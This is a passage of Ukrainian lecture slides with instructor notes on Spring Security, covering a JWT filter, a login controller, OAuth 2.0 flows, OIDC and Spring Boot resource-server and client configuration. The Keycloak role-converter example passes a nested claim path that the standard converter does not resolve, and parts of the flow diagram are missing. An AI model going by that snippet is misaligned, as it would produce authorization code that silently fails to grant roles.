    protected void doFilterInternal(
            HttpServletRequest request,
            HttpServletResponse response,
            FilterChain filterChain) throws ServletException, IOException {

        // 1. Витягуємо токен з заголовка
        String authHeader = request.getHeader("Authorization");
        if (authHeader == null || !authHeader.startsWith("Bearer ")) {
            filterChain.doFilter(request, response);
            return;
        }

        String jwt = authHeader.substring(7); // прибираємо "Bearer "

        // 2. Витягуємо username з токена
        String username = jwtService.extractUsername(jwt);

        // 3. Якщо ще не автентифікований — перевіряємо
        if (username != null && SecurityContextHolder.getContext()
                .getAuthentication() == null) {

            UserDetails userDetails = userDetailsService
                .loadUserByUsername(username);

            // 4. Валідуємо токен
            if (jwtService.isTokenValid(jwt, userDetails)) {
                UsernamePasswordAuthenticationToken authToken =
                    new UsernamePasswordAuthenticationToken(
                        userDetails,
                        null,
                        userDetails.getAuthorities()
                    );
                authToken.setDetails(
                    new WebAuthenticationDetailsSource()
                        .buildDetails(request)
                );

                // 5. Встановлюємо автентифікацію в контекст
                SecurityContextHolder.getContext()
                    .setAuthentication(authToken);
            }
        }

        filterChain.doFilter(request, response);
    }
}
```

### Пояснення для викладача:

Це фільтр, який перехоплює КОЖЕН HTTP-запит і перевіряє JWT. Він наслідує `OncePerRequestFilter` — гарантія що фільтр виконається рівно один раз на запит (навіть якщо внутрішньо відбуваються forward/redirect).

**Крок за кроком:**

**Крок 1:** Витягуємо заголовок `Authorization`. Якщо його немає або він не починається з "Bearer " — просто передаємо запит далі по ланцюгу (`filterChain.doFilter()`). Це НЕ означає помилку — можливо цей endpoint публічний (`permitAll()`), або автентифікація відбувається іншим способом. Прибираємо "Bearer " (7 символів) щоб отримати чистий JWT.

**Крок 2:** Витягуємо username з JWT (з claim `sub`). На цьому етапі ми ще не перевірили підпис повністю — тільки декодували payload. Але `extractUsername()` внутрішньо викликає `parseClaimsJws()`, який перевіряє підпис.

**Крок 3:** Перевіряємо `SecurityContextHolder.getContext().getAuthentication() == null` — якщо користувач вже автентифікований (наприклад, іншим фільтром), не перезаписуємо. Далі завантажуємо UserDetails з БД — нам потрібні актуальні ролі (вони могли змінитися після видачі токена).

**Крок 4:** Валідуємо токен — перевіряємо що username з токена збігається з username з БД і токен не протермінований.

**Крок 5:** Якщо все ОК — створюємо `UsernamePasswordAuthenticationToken` (з `authenticated = true`, бо передаємо authorities в конструктор) і кладемо в SecurityContext. Тепер Spring Security знає хто зробив запит. `WebAuthenticationDetailsSource` додає IP-адресу і session ID до деталей — корисно для аудиту.

**Як цей фільтр реєструється в ланцюгу:**
```java
http.addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class);
```
Це означає: виконувати JwtAuthenticationFilter ПЕРЕД UsernamePasswordAuthenticationFilter. Тобто спочатку перевіряємо JWT, і тільки якщо його немає — переходимо до інших способів автентифікації.

## Слайд 3.7 — Реалізація: AuthController

```java
@RestController
@RequestMapping("/api/auth")
@RequiredArgsConstructor
public class AuthController {

    private final AuthenticationManager authenticationManager;
    private final JwtService jwtService;
    private final UserDetailsService userDetailsService;

    @PostMapping("/login")
    public ResponseEntity<AuthResponse> login(@RequestBody AuthRequest request) {
        // 1. Автентифікація через Spring Security
        authenticationManager.authenticate(
            new UsernamePasswordAuthenticationToken(
                request.getUsername(),
                request.getPassword()
            )
        );

        // 2. Завантаження UserDetails
        UserDetails userDetails = userDetailsService
            .loadUserByUsername(request.getUsername());

        // 3. Генерація JWT
        String token = jwtService.generateToken(userDetails);

        return ResponseEntity.ok(new AuthResponse(token));
    }
}

// DTO
record AuthRequest(String username, String password) {}
record AuthResponse(String token) {}
```

### Пояснення для викладача:

Це endpoint, де користувач "обмінює" логін+пароль на JWT. Тут немає нічого магічного — три простих кроки:

**Крок 1:** Делегуємо перевірку credentials Spring Security. `authenticationManager.authenticate()` запускає весь flow зі слайду 2.5: AuthenticationManager → AuthenticationProvider → UserDetailsService + PasswordEncoder. Якщо credentials неправильні — кидається `BadCredentialsException`, і Spring повертає 401.

**Крок 2:** Якщо автентифікація пройшла — завантажуємо UserDetails, щоб отримати ролі для JWT.

**Крок 3:** Генеруємо JWT і повертаємо клієнту.

**Чому два виклики — authenticate і loadUserByUsername?** Можна оптимізувати: `authenticate()` повертає `Authentication`, звідки можна отримати `principal`. Але для чіткості прикладу — два окремі кроки зрозуміліші для навчання.

**Важливий момент:** цей endpoint `/api/auth/login` повинен бути у конфігурації Security як `permitAll()` — інакше для логіну потрібен... логін (замкнене коло).

**Records у Java:** `record AuthRequest(String username, String password) {}` — це компактний спосіб створити immutable DTO з конструктором, геттерами, equals, hashCode, toString. Ідеально для request/response DTO.

## Слайд 3.8 — JWT: Обмеження та Best Practices

**Обмеження JWT:**
```
⚠ Не можна відкликати (revoke) до закінчення терміну дії
⚠ Payload не зашифрований — не зберігайте чутливі дані
⚠ Розмір токена росте з кількістю claims
⚠ Secret key — єдина точка безпеки
```

**Best Practices:**
```
✓ Короткий термін дії (15-30 хвилин для access token)
✓ Використовуйте Refresh Token для оновлення
✓ Зберігайте мінімум даних у payload
✓ Використовуйте HTTPS завжди
✓ Secret key — мінімум 256 біт
✓ Не зберігайте JWT у localStorage (XSS вразливість)
✓ Використовуйте HttpOnly cookies або in-memory storage
```

**Access Token + Refresh Token:**
```
Access Token:   короткий термін (15 хв), для доступу до API
Refresh Token:  довгий термін (7 днів), для отримання нового Access Token

Чому два токени?
→ Якщо Access Token вкрадено — зловмисник має лише 15 хвилин
→ Refresh Token зберігається безпечніше та перевіряється в БД
```

### Пояснення для викладача:

**Проблема відкликання (revocation):** Це головна "слабкість" JWT. Уявіть: адмін звільнив співробітника і видалив його акаунт. Але у співробітника є валідний JWT з терміном дії ще 1 година. Протягом цієї години він все ще може робити запити! Сервер не зберігає стан — він не знає що токен "відкликаний".

Рішення: 1) Робити access token дуже короткоживучим (15 хв) — так вікно вразливості мінімальне. 2) Вести "чорний список" (blacklist) відкликаних токенів у Redis — але це додає stateful-елемент і нівелює перевагу JWT. 3) Використовувати refresh token, який зберігається в БД і може бути видалений.

**Чому два токени — Access + Refresh:**
Access Token — короткоживучий (15-30 хв), передається з кожним API-запитом в Authorization header. Якщо вкрадений — зловмисник має обмежений час.

Refresh Token — довгоживучий (7-30 днів), зберігається в БД на сервері, використовується ТІЛЬКИ для отримання нового Access Token (через спеціальний endpoint `POST /api/auth/refresh`). Коли сервер отримує Refresh Token, він перевіряє його в БД (чи не відкликаний?), і якщо ОК — видає новий Access Token.

Якщо потрібно "вигнати" користувача — видаляємо його Refresh Token з БД. Поточний Access Token доживе свої 15 хвилин, але новий він отримати не зможе.

**localStorage vs HttpOnly Cookie:** localStorage доступний з JavaScript — якщо на сайті є XSS-вразливість, зловмисник може прочитати токен через `document.cookie` або `localStorage.getItem('token')`. HttpOnly Cookie не доступний з JavaScript — тільки браузер автоматично додає його до запитів. Це безпечніше, але складніше налаштувати з CORS.

## Слайд 4.1 — Проблема: Навіщо потрібен OAuth?

```
Ситуація: Ваш додаток хоче отримати доступ до Google Calendar користувача

Підхід БЕЗ OAuth (ПОГАНО):
┌────────┐  "Дай мені свій Google пароль"  ┌────────┐
│  Ваш   │ ──────────────────────────────► │  User  │
│  App   │                                 └────────┘
└────────┘

Проблеми:
  ✗ Користувач довіряє пароль третій стороні
  ✗ Повний доступ до акаунту
  ✗ Неможливо відкликати доступ вибірково

Підхід З OAuth (ДОБРЕ):
┌────────┐  "Дозволь доступ до Calendar"   ┌────────┐
│  Ваш   │ ──── через Google Login ──────► │  User  │  ✓
│  App   │     (обмежений scope)           └────────┘
└────────┘
```

> OAuth 2.0 — це протокол **делегованої авторизації**. Він дозволяє додатку отримати обмежений доступ до ресурсів користувача БЕЗ передачі пароля.

### Пояснення для викладача:

Почніть з історичної проблеми: до OAuth, якщо ваш додаток хотів працювати з даними користувача в іншій системі (наприклад, імпортувати контакти з Gmail), єдиний спосіб був — попросити користувача ввести свій Google-пароль у вашому додатку. Це жахливо з точки зору безпеки:

1. **Користувач довіряє пароль** — ваш додаток може зберігати пароль і використовувати його для чого завгодно
2. **Повний доступ** — маючи пароль, ви маєте доступ до ВСЬОГО (пошта, диск, фото, платежі), а не тільки до контактів
3. **Неможливо відкликати** — щоб заборонити доступ, користувач повинен змінити пароль (і "зламати" всі інші додатки, які його використовували)

OAuth 2.0 (2012) вирішив цю проблему: користувач НЕ передає пароль вашому додатку. Замість цього: 1) ваш додаток перенаправляє користувача на Google, 2) користувач логіниться НА САЙТІ Google і дозволяє доступ, 3) Google видає ТОКЕН вашому додатку з обмеженими правами (тільки Calendar, не email чи фото).

**Ключове слово — "делегована авторизація"**: користувач ДЕЛЕГУЄ (передає) частину своїх прав вашому додатку. Не всі права, а конкретні (scope). І може відкликати ці права у будь-який момент (у налаштуваннях Google: "Додатки з доступом до вашого акаунту").

## Слайд 4.2 — Ролі в OAuth 2.0

```
┌──────────────────┐        ┌──────────────────────┐
│  Resource Owner   │        │  Authorization Server │
│  (Користувач)     │        │  (Google, Keycloak)   │
│                   │        │                       │
│  Той, хто володіє │        │  Видає токени,        │
│  ресурсами        │        │  перевіряє identity   │
└──────────────────┘        └──────────────────────┘

┌──────────────────┐        ┌──────────────────────┐
│  Client           │        │  Resource Server      │
│  (Ваш додаток)    │        │  (API з ресурсами)    │
│                   │        │                       │
│  Хоче доступ до   │        │  Зберігає захищені    │
│  ресурсів         │        │  ресурси (дані)       │
└──────────────────┘        └──────────────────────┘
```

**Приклад:**
- **Resource Owner** — ви (власник Google акаунту)
- **Client** — Trello (хоче доступ до вашого Calendar)
- **Authorization Server** — Google OAuth
- **Resource Server** — Google Calendar API

### Пояснення для викладача:

Чотири ролі в OAuth 2.0 — це важливо зафіксувати, бо студенти часто плутають Client з Resource Owner і Authorization Server з Resource Server.

**Resource Owner (Власник ресурсів):** Це кінцевий користувач — людина, яка має акаунт і дані. Він "володіє" своїми контактами, файлами, календарем. Він приймає рішення — дозволити чи ні доступ до своїх даних. У більшості випадків це фізична особа, але може бути й додаток (у client credentials flow).

**Client (Клієнт):** Це ваш додаток, який хоче отримати доступ до ресурсів. "Клієнт" — в контексті OAuth, а не "клієнт" як кінцевий користувач. Client реєструється на Authorization Server і отримує `client_id` та `client_secret` (як логін і пароль для вашого додатку). Важливо: Client НЕ зберігає пароль користувача — він отримує тимчасовий токен.

**Authorization Server (Сервер авторизації):** Центральний компонент. Він: 1) автентифікує Resource Owner (показує форму логіну), 2) запитує дозвіл на доступ (consent screen), 3) видає токени (access token, refresh token). Приклади: Google OAuth, GitHub OAuth, Keycloak, Auth0, Okta. У мікросервісній архітектурі часто піднімають свій Authorization Server (Keycloak).

**Resource Server (Сервер ресурсів):** API, який зберігає захищені дані і приймає запити з access token. Він НЕ автентифікує користувача — він довіряє Authorization Server. Отримуючи токен, Resource Server перевіряє його підпис (або робить запит до Auth Server для перевірки) і на основі claims приймає рішення про авторизацію.

**Важливий нюанс:** Authorization Server і Resource Server можуть бути одним і тим же сервером (наприклад, Google для Google API), або різними (Keycloak як Auth Server, ваш API як Resource Server). У Spring Boot ви зазвичай пишете Resource Server, а Keycloak виступає як Authorization Server.

## Слайд 4.3 — Authorization Code Flow (Основний)

```
└──┬───┘          └───┬────┘         └──────┬───────┘        └────┬─────┘
   │ 1. Click Login   │                     │                     │
   │─────────────────►│                     │                     │
   │                  │ 2. Redirect to      │                     │
   │                  │    Auth Server       │                     │
   │◄─────────────────│    + client_id      │                     │
   │                  │    + redirect_uri   │                     │
   │                  │    + scope          │                     │
   │ 3. Login Page    │                     │                     │
   │◄─────────────────────────────────────── │                     │
   │                  │                     │                     │

   │                  │                     │                     │

   │◄───────────────────────────────────────│                     │
   │─────────────────►│                     │                     │
   │                  │ 6. Exchange Code    │                     │
   │                  │    for Tokens       │                     │
   │                  │    + client_secret  │                     │
   │                  │────────────────────►│                     │
   │                  │                     │                     │

   │                  │    + Refresh Token  │                     │
   │                  │◄────────────────────│                     │
   │                  │                     │                     │
   │                  │ 8. API call with    │                     │
   │                  │    Access Token     │                     │
   │                  │─────────────────────────────────────────►│
   │                  │                     │                     │
   │                  │ 9. Protected        │                     │
   │                  │    Resource         │                     │
   │                  │◄─────────────────────────────────────────│
```

### Пояснення для викладача:

Authorization Code Flow — це основний і найбезпечніший flow в OAuth 2.0. Пройдіться по кожному кроку ПОВІЛЬНО, бо це найскладніша діаграма лекції:

**Крок 1-2 — Ініціація:** Користувач натискає "Login with Google" у вашому додатку. Ваш додаток (Client) формує URL і перенаправляє браузер на Authorization Server:
```
https://accounts.google.com/o/oauth2/v2/auth?
  client_id=your-app-123          ← ID вашого додатку (отримали при реєстрації)
  redirect_uri=https://yourapp.com/callback  ← куди повернути користувача
  response_type=code              ← ми хочемо Authorization Code
  scope=openid+email+calendar     ← які дозволи просимо
  state=abc123                    ← захист від CSRF (випадковий рядок)
```

**Крок 3-4 — Автентифікація:** Google показує свою форму логіну. Користувач вводить свій Google-логін і пароль. Зверніть увагу: пароль вводиться НА САЙТІ Google, а НЕ у вашому додатку! Ваш додаток НІКОЛИ не бачить цей пароль. Потім Google показує consent screen: "Додаток MyApp просить доступ до вашого email і Calendar. Дозволити?"

**Крок 5 — Authorization Code:** Якщо користувач дозволяє — Google перенаправляє браузер назад на ваш `redirect_uri` з коротким одноразовим кодом:
```
https://yourapp.com/callback?code=4/P7q7W91&state=abc123
```
Цей код — НЕ токен! Він короткоживучий (зазвичай 1-10 хвилин), одноразовий, і без client_secret марний. Навіть якщо зловмисник перехопить цей код у URL — він не зможе його використати без client_secret.

**Крок 6-7 — Обмін коду на токени:** Ваш бекенд (НЕ браузер!) робить POST-запит до Google:
```
POST https://oauth2.googleapis.com/token
  code=4/P7q7W91
  client_id=your-app-123
  client_secret=your-secret-456    ← секрет, який знає тільки ваш сервер!
  redirect_uri=https://yourapp.com/callback
  grant_type=authorization_code
```
Google перевіряє code + client_secret і повертає Access Token + Refresh Token. Цей обмін відбувається server-to-server — браузер не бачить ці токени.

**Крок 8-9 — Використання:** Ваш бекенд робить запити до Google Calendar API з Access Token у заголовку `Authorization: Bearer ...`.

**Чому такий складний процес?** Чому б не видати токен одразу на кроці 5? Бо URL (з кодом) проходить через браузер і може бути видимий в history, логах, Referer-заголовках. Код без client_secret марний — а client_secret зберігається тільки на сервері і ніколи не потрапляє в браузер.

## Слайд 4.4 — Чому саме Authorization Code Flow?

**Чому не передати токен одразу (Implicit Flow)?**

```
Authorization Code Flow:
  Browser бачить тільки CODE (короткоживучий, одноразовий)
  Токен передається server-to-server (не видно у browser)

Implicit Flow (DEPRECATED):
  Токен передається через browser URL fragment
  ⚠ Видно в browser history
  ⚠ Може бути перехоплений через Referer header
```

**Ключовий момент:** Authorization Code обмінюється на токен на **бекенді**, де зберігається `client_secret`. Це значно безпечніше.

### Пояснення для викладача:

**Implicit Flow** — це спрощений flow, де Authorization Server повертає Access Token одразу в URL fragment (`#access_token=...`), без проміжного code. Він був створений для SPA (Single Page Applications), які не мають бекенду і не можуть зберігати client_secret.

Чому він deprecated (застарілий)?
1. Токен видно в URL browser history
2. Токен може потрапити в логи proxy-серверів
3. Referer header може "витекти" токен на інші сайти
4. Немає Refresh Token — коли Access Token закінчується, потрібен повторний логін

**Заміна для SPA:** Authorization Code Flow з PKCE (Proof Key for Code Exchange). PKCE додає додатковий захист: клієнт генерує випадковий `code_verifier`, хешує його в `code_challenge` і відправляє challenge при запиті коду. При обміні коду на токен відправляє `code_verifier`. Auth Server перевіряє що verifier відповідає challenge. Навіть якщо зловмисник перехопить code — без code_verifier він не зможе отримати токен.

## Слайд 4.5 — Client Credentials Flow (Міжсервісний)

```
Коли: сервіс хоче звернутися до іншого сервісу (без участі користувача)

┌──────────┐                      ┌──────────────┐
│ Service A │                      │  Auth Server  │
│ (Client)  │                      │  (Keycloak)   │
└─────┬────┘                      └──────┬───────┘
      │ 1. POST /token                   │
      │    grant_type=client_credentials  │
      │    client_id=service-a            │
      │    client_secret=xxxxx            │
      │──────────────────────────────────►│
      │                                   │
      │ 2. { "access_token": "eyJ..." }   │
      │◄──────────────────────────────────│
      │                                   │
      │ 3. GET /api/data                  │
      │    Authorization: Bearer eyJ...   │
      │──────────────────────────────────► Service B
```

**Використання:** мікросервіси, cron jobs, бекенд інтеграції.

### Пояснення для викладача:

Client Credentials Flow — найпростіший flow. Тут немає Resource Owner (користувача) — один сервіс просто хоче звернутися до іншого сервісу.

**Приклад з реального світу:** Order Service повинен перевірити наявність товару в Inventory Service. Тут немає "користувача" — це міжсервісна комунікація. Order Service автентифікується як "додаток" (не як конкретний юзер) і отримує токен з правами, визначеними для цього сервісу.

**Як це працює:**
1. Service A зареєстрований у Keycloak як Client з `client_id` та `client_secret`
2. Service A відправляє POST-запит до token endpoint з grant_type=client_credentials і своїми credentials
3. Keycloak перевіряє client_id + client_secret і повертає Access Token
4. Service A використовує цей токен для запитів до Service B

**Різниця від Authorization Code Flow:** немає redirect, немає браузера, немає consent screen. Все відбувається server-to-server. Токен містить інформацію про СЕРВІС, а не про користувача — `sub` буде `service-a`, а не `john@example.com`.

**Коли використовувати:** cron jobs (нічні процеси обробки даних), міжсервісні виклики, інтеграції з зовнішніми API, batch processing.

## Слайд 4.6 — OAuth 2.0 vs OpenID Connect

```
OAuth 2.0                          OpenID Connect (OIDC)
──────────────────────────        ──────────────────────────────
Протокол АВТОРИЗАЦІЇ               Надбудова над OAuth 2.0
"Що дозволено?"                    Додає АВТЕНТИФІКАЦІЮ
                                   "Хто це?"
Видає Access Token                 Додає ID Token (JWT)

Не стандартизує                    Стандартизує:
інформацію про                     - /userinfo endpoint
користувача                        - стандартні claims
                                   - Discovery endpoint
```

**ID Token (OIDC)** — JWT з інформацією про користувача:
```json
{
  "iss": "https://keycloak.example.com/realms/myapp",
  "sub": "user-uuid-123",
  "aud": "my-client-app",
  "exp": 1716603600,
  "iat": 1716600000,
  "email": "john@example.com",
  "name": "John Doe",
  "preferred_username": "john",
  "realm_access": {
    "roles": ["ROLE_USER", "ROLE_ADMIN"]
  }
}
```

> OIDC = OAuth 2.0 + Identity Layer. У 99% випадків ви використовуєте OIDC, а не "чистий" OAuth.

### Пояснення для викладача:

Це важливе концептуальне розмежування, яке часто плутають навіть досвідчені розробники.

**OAuth 2.0 сам по собі** — це протокол АВТОРИЗАЦІЇ ("що дозволено"), а НЕ автентифікації ("хто це"). OAuth 2.0 видає Access Token, який дозволяє доступ до ресурсів. Але Access Token не містить стандартизованої інформації про користувача — він може бути opaque (непрозорий рядок), і ваш додаток не знає ХТО цей користувач.

**Проблема:** всі хотіли використовувати OAuth для логіну ("Login with Google"), але OAuth для цього не призначений. Різні провайдери робили це по-різному (свої endpoint-и, свої формати), і не було стандарту.

**OpenID Connect (OIDC)** — це НАДБУДОВА над OAuth 2.0, яка додає стандартний спосіб автентифікації. Вона додає:

1. **ID Token** — JWT, який ЗАВЖДИ містить стандартні claims про користувача (sub, email, name). Access Token — для API, ID Token — для вашого додатку (щоб знати хто залогінився).

2. **UserInfo Endpoint** — стандартний endpoint (`/userinfo`), де можна отримати додаткову інформацію про користувача за access token.

3. **Discovery Endpoint** — `.well-known/openid-configuration` — JSON з усіма URL-ами Authorization Server (token endpoint, userinfo endpoint, jwks endpoint). Ваш додаток може автоматично знайти всі потрібні URL.

4. **Стандартні claims** — `sub`, `email`, `name`, `picture`, `locale` — всі провайдери повертають їх в однаковому форматі.

**Аналогія:** OAuth 2.0 — це як система пропусків у торговому центрі (ви можете пройти в магазин, але магазин не знає хто ви). OIDC — це пропуск + ID-картка (магазин знає хто ви і може персоналізувати досвід).

**У практиці:** коли ви налаштовуєте "Login with Google" або "Login with Keycloak" — ви використовуєте OIDC. Scope `openid` в запиті — це маркер що ви хочете OIDC (а не просто OAuth).

## Слайд 4.7 — Scopes та Consent

**Scope** — визначає обсяг доступу:

```
openid          — базова автентифікація (обов'язковий для OIDC)
profile         — ім'я, фото, дата народження
email           — email та email_verified
phone           — телефон
offline_access  — дозвіл на Refresh Token
```

**Consent Screen** (екран згоди):
```
┌─────────────────────────────────────────┐
│        MyApp wants to access:           │
│                                         │
│  ✓ Your email address                   │
│  ✓ Your profile information             │
│  ✗ Your contacts (not requested)        │
│                                         │
│     [ Allow ]     [ Deny ]              │
└─────────────────────────────────────────┘
```

### Пояснення для викладача:

**Scope** — це механізм обмеження доступу. Коли ваш додаток запитує scope=email+calendar — Authorization Server видасть токен, який працює ТІЛЬКИ для email і calendar. Спроба звернутися до Contacts API з цим токеном буде відхилена.

Стандартні OIDC scopes:
- `openid` — обов'язковий для OIDC. Без нього Auth Server поводиться як чистий OAuth 2.0 (без ID Token).
- `profile` — дозвіл на claims: `name`, `family_name`, `given_name`, `picture`, `gender`, `birthdate`, `locale`
- `email` — дозвіл на claims: `email`, `email_verified`
- `phone` — дозвіл на claims: `phone_number`, `phone_number_verified`
- `offline_access` — дозвіл на отримання Refresh Token. Без цього scope Auth Server може не видати Refresh Token.

Крім стандартних, Auth Server може визначати кастомні scope: `calendar.read`, `calendar.write`, `admin.users` тощо.

**Consent Screen** — це екран, де користувач ЯВНО бачить які дозволи просить ваш додаток і може погодитись або відхилити. Це важливий елемент довіри і захисту приватності. Для внутрішніх додатків (наприклад, у Keycloak для вашого ж API) consent screen можна вимкнути — немає сенсу питати користувача "чи дозволяєте ви НАШОМУ ж додатку доступ до НАШОГО ж API?".

## Слайд 4.8 — Spring Boot як OAuth 2.0 Resource Server

```xml
<!-- pom.xml -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-oauth2-resource-server</artifactId>
</dependency>
```

```yaml
# application.yml
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          issuer-uri: http://localhost:8080/realms/myapp
          # або jwk-set-uri для прямого вказування ключів
```

```java
@Configuration
@EnableWebSecurity
public class ResourceServerConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .oauth2ResourceServer(oauth2 -> oauth2
                .jwt(jwt -> jwt
                    .jwtAuthenticationConverter(jwtAuthConverter())
                )
            );

        return http.build();
    }

    // Конвертуємо Keycloak roles у Spring Security authorities
    private JwtAuthenticationConverter jwtAuthConverter() {
        JwtGrantedAuthoritiesConverter converter =
            new JwtGrantedAuthoritiesConverter();
        converter.setAuthoritiesClaimName("realm_access.roles");
        converter.setAuthorityPrefix("ROLE_");

        JwtAuthenticationConverter jwtConverter =
            new JwtAuthenticationConverter();
        jwtConverter.setJwtGrantedAuthoritiesConverter(converter);
        return jwtConverter;
    }
}
```

### Пояснення для викладача:

Це конфігурація вашого API як Resource Server — він приймає JWT-токени від Keycloak і перевіряє їх.

**`issuer-uri`** — URL вашого Authorization Server. Spring Boot автоматично зайде на `issuer-uri + /.well-known/openid-configuration`, отримає звідти `jwks_uri` (URL з публічними ключами), і використає ці ключі для перевірки підпису JWT. Тобто вам не потрібно копіювати секретний ключ — Spring Boot все зробить сам через discovery.

**`oauth2ResourceServer(oauth2 -> oauth2.jwt(...))`** — вмикає JWT-валідацію. Spring Security автоматично: 1) витягує JWT з заголовка `Authorization: Bearer ...`, 2) перевіряє підпис через публічний ключ, 3) перевіряє exp, iss, aud, 4) конвертує claims у Authentication об'єкт.

**`jwtAuthConverter()`** — тут відбувається "маппінг" claims з JWT на Spring Security authorities. Проблема: Keycloak зберігає ролі в nested структурі `realm_access.roles`, а Spring Security очікує плоский список authorities. Конвертер "витягує" ролі з потрібного claim і додає префікс `ROLE_`.

Без конвертера Spring Security за замовчуванням шукає ролі в claim `scope` (наприклад, `scope: "openid email profile"` → authorities: `SCOPE_openid`, `SCOPE_email`, `SCOPE_profile`). Але Keycloak кладе ролі в `realm_access.roles` — тому потрібен кастомний конвертер.

## Слайд 4.9 — Spring Boot як OAuth 2.0 Client

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-oauth2-client</artifactId>
</dependency>
```

```yaml
spring:
  security:
    oauth2:
      client:
        registration:
          google:
            client-id: ${GOOGLE_CLIENT_ID}
            client-secret: ${GOOGLE_CLIENT_SECRET}
            scope: openid, profile, email
          keycloak:
            client-id: my-app
            client-secret: ${KEYCLOAK_SECRET}
            scope: openid, profile
            authorization-grant-type: authorization_code
        provider:
          keycloak:
            issuer-uri: http://localhost:8080/realms/myapp
```

```java
@Configuration
@EnableWebSecurity
public class ClientSecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/", "/login").permitAll()
                .anyRequest().authenticated()
            )
            .oauth2Login(Customizer.withDefaults()); // магія OAuth Login

        return http.build();
    }
}
```

> Після цієї конфігурації Spring Boot автоматично створює `/login` сторінку з кнопками "Login with Google" та "Login with Keycloak".

### Пояснення для викладача:

Це конфігурація вашого додатку як OAuth Client — він перенаправляє користувача на Authorization Server для логіну.

**`registration`** — тут ви реєструєте OAuth-провайдерів. Для Google — Spring Boot має вбудовану конфігурацію (знає всі URL автоматично), потрібно тільки client-id і client-secret (отримуєте в Google Cloud Console). Для Keycloak — потрібно додатково вказати issuer-uri.

**`client-id` та `client-secret`** — це credentials вашого ДОДАТКУ (не користувача!). Їх ви отримуєте при реєстрації додатку на Authorization Server. `client-id` — публічний (видно в URL), `client-secret` — секретний (тільки на бекенді). Зверніть увагу: вони зберігаються в environment variables (`${GOOGLE_CLIENT_ID}`), а НЕ захардкоджені в коді.

**`.oauth2Login(Customizer.withDefaults())`** — ця одна лінія робить величезну роботу:
1. Створює сторінку `/login` зі списком провайдерів
2. Обробляє redirect на Authorization Server (крок 2 з діаграми)
3. Обробляє callback з authorization code (крок 5)
4. Обмінює code на tokens (кроки 6-7)
5. Створює Authentication об'єкт і кладе в SecurityContext
6. Перенаправляє користувача на оригінальний URL

Все це — автоматично. Spring Boot = Convention over Configuration.

**Коли ви Client, а коли Resource Server?** Якщо ваш додаток — це веб-сайт з UI (Thymeleaf, Angular/React з бекендом), і ви хочете "Login with Google" → ви Client. Якщо ваш додаток — це REST API, який приймає JWT-токени від фронтенду → ви Resource Server. Часто додаток є і тим, і іншим одночасно.

## Слайд 4.10 — Підсумок: Що ми вивчили

```
Блок 1: Основи безпеки
  ├── Authentication ≠ Authorization
  ├── RBAC — ролі як шаблони дозволів (90% проектів)
  ├── ABAC — контроль на основі атрибутів (складні бізнес-правила)
  ├── OWASP Top 10 — знай свого ворога
  └── Spring Boot вже вирішує багато проблем

Блок 2: Spring Security
  ├── SecurityFilterChain — ланцюг фільтрів
  ├── Authentication Flow — Manager → Provider → UserDetailsService + PasswordEncoder
  ├── UserDetails / UserDetailsService — контракт з Spring Security
  ├── PasswordEncoder — BCrypt як стандарт (salt + cost factor)
  ├── SecurityContext — доступ до поточного user (Principal)
  └── @WithMockUser — тестування безпеки

Блок 3: JWT
  ├── Header.Payload.Signature — підписаний, але НЕ зашифрований
  ├── Self-contained — сервер не зберігає стан
  ├── Access + Refresh Token pattern
  ├── JwtService — генерація та валідація
  └── JwtAuthenticationFilter — інтеграція зі Spring Security

Блок 4: OAuth 2.0 & OIDC
  ├── Делегована авторизація — доступ без передачі пароля
  ├── 4 ролі: Resource Owner, Client, Auth Server, Resource Server
  ├── Authorization Code Flow — основний та найбезпечніший
  ├── Client Credentials Flow — для міжсервісної комунікації
  ├── OIDC = OAuth + Identity (ID Token + UserInfo + Discovery)
  └── Spring Boot Resource Server / Client конфігурація
```

**Наступна лекція:** Keycloak (практика), Method Security (@PreAuthorize, @Secured)

### Пояснення для викладача:

Підсумок — це момент для закріплення ключових ідей. Пройдіться по кожному блоку і задайте контрольні питання аудиторії:

1. "Яка різниця між 401 і 403?" → 401 = не автентифікований, 403 = немає прав
2. "Чому JWT не можна відкликати?" → бо сервер stateless, не зберігає стан
3. "Навіщо Authorization Code, а не одразу Access Token?" → безпека — код марний без client_secret
4. "Що таке Principal?" → об'єкт з інформацією про поточного автентифікованого користувача
5. "Чому BCrypt, а не MD5?" → BCrypt повільний (захист від brute-force) і має salt (захист від rainbow tables)
